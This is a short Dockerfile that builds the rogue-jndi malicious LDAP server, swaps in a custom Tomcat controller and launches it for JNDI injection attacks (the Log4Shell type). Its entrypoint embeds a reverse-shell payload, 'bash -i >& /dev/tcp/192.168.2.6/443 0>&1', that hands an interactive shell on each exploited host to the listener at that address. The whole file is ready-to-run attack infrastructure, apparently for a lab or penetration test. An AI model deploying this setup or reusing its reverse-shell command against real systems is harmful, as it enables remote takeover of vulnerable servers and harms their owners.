FROM maven as builder

RUN git clone https://github.com/veracode-research/rogue-jndi \
    && mkdir /usr/src/app \
    && cp -avr rogue-jndi/src /usr/src/app/src \
    && cp -av rogue-jndi/pom.xml /usr/src/app
COPY files/Tomcat.java /usr/src/app/src/main/java/artsploit/controllers/Tomcat.java
    ##### Compile rogue-jndi #####
RUN mvn -f /usr/src/app/pom.xml clean package -DskipTests

FROM openjdk:8-alpine
COPY --from=builder /usr/src/app/target/RogueJndi-1.1.jar /usr/app/RogueJndi-1.1.jar

EXPOSE 1389 8888

ENTRYPOINT ["java", "-jar", "/usr/app/RogueJndi-1.1.jar", "-l", "1389", "-p", "8888", "-c", "bash -i >& /dev/tcp/192.168.2.6/443 0>&1", "--hostname", "192.168.2.6"]